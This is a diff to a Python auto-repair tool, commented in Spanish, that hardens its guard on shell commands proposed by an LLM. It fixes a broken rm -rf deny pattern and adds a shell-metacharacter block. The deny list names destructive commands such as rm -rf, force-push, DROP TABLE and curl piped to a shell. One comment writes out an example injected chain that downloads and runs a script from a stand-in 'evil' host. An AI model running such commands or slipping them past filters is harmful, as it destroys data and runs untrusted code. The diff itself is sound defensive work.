@@ -159,8 +159,15 @@ _REPAIR_STEPS: dict = {
 }
 
 # Commands the repair executor is NEVER allowed to run (defense-in-depth)
+# NOTA (fix 2026-11-24): el patron rm -rf original era "rm\s+-rf\s+[^/tmp]" -- [^/tmp] es
+# una CLASE de caracteres (cualquier caracter que no sea '/','t','m','p'), no "una ruta que no
+# empiece por /tmp" como pretendia. Como toda ruta absoluta empieza por '/' (que SI esta en esa
+# clase excluida), el patron jamas hacia match en "rm -rf /", "rm -rf /etc", "rm -rf /home/..."
+# -- exactamente los casos destructivos que debia bloquear. Verificado con pruebas. Arreglado
+# con un lookahead negativo real sobre "/tmp/".
 _FORBIDDEN_RE = re.compile(
-    r"rm\s+-rf\s+[^/tmp]|"
+    r"rm\s+-[a-z]*r[a-z]*f[a-z]*\s+(?!/tmp/)\S|"   # rm -rf <algo> que no sea bajo /tmp/
+    r"rm\s+-[a-z]*f[a-z]*r[a-z]*\s+(?!/tmp/)\S|"   # variante -fr
     r"git\s+reset\s+--hard|"
     r"git\s+push\s+--force|"
     r"DROP\s+(TABLE|DATABASE)|"
@@ -168,6 +175,15 @@ _FORBIDDEN_RE = re.compile(
     r"curl\s+https?://\S+\s*\|",
     re.I
 )
+
+# NOTA (fix 2026-11-24): el allowlist de _ask_qwen_for_fix solo comprobaba que el comando
+# EMPEZARA por un prefijo permitido (re.match sin ancla de fin), así que un LLM (o un error
+# con contenido no confiable -- root_cause/stderr vienen de salida real de Docker/objetivos
+# CVE, potencialmente hostiles) podia colar "pip install x && curl evil/x.sh -o /tmp/x.sh &&
+# bash /tmp/x.sh" y pasaba el allowlist igualmente, ejecutandose despues via shell=True. Este
+# patron bloquea cualquier metacaracter de shell que permita encadenar o inyectar comandos
+# adicionales tras el prefijo permitido.
+_SHELL_METACHAR_RE = re.compile(r"[;&|`$\n<>]")
 
 # Packages that may never be pip-installed by autonomous repair
 _FORBIDDEN_PKGS = {"pwntools", "exploit", "shellcode", "rootkit"}
@@ -213,8 +229,12 @@ def _ask_qwen_for_fix(error: ErrorRecord, context_hint: str = "") -> Optional[st
         # Safety: reject if forbidden
         if _FORBIDDEN_RE.search(cmd):
             return None
-        # Only accept pip, docker, chmod, git-safe commands
+        # Only accept pip, docker, chmod, git-safe commands -- prefix match alone is not
+        # enough (see _SHELL_METACHAR_RE note above): also reject any shell metacharacter that
+        # would let the LLM smuggle extra commands after an allowed prefix.
         if not re.match(r"^(pip[23]? install|docker (restart|start|stop|logs|ps)|chmod|git (stash|status|diff))", cmd, re.I):
+            return None
+        if _SHELL_METACHAR_RE.search(cmd):
             return None
         return cmd
     except Exception:
@@ -227,6 +247,12 @@ def _run_cmd(cmd: str, cwd: str, timeout: int = _REPAIR_TIMEOUT_S) -> Tuple[bool
     """Execute a shell command safely. Returns (success, output)."""
     if _FORBIDDEN_RE.search(cmd):
         return False, f"[repair] blocked by policy: {cmd}"
+    # Defense-in-depth: block shell metacharacters here too, at the actual execution
+    # chokepoint for both the deterministic table AND the Qwen-proposed path, in case a
+    # future template ever interpolates an unfiltered value (e.g. error.file_path is not
+    # regex-filtered like pkg/container are).
+    if _SHELL_METACHAR_RE.search(cmd):
+        return False, f"[repair] blocked (shell metacharacter): {cmd}"
     try:
         r = subprocess.run(
             cmd, shell=True, capture_output=True, text=True,
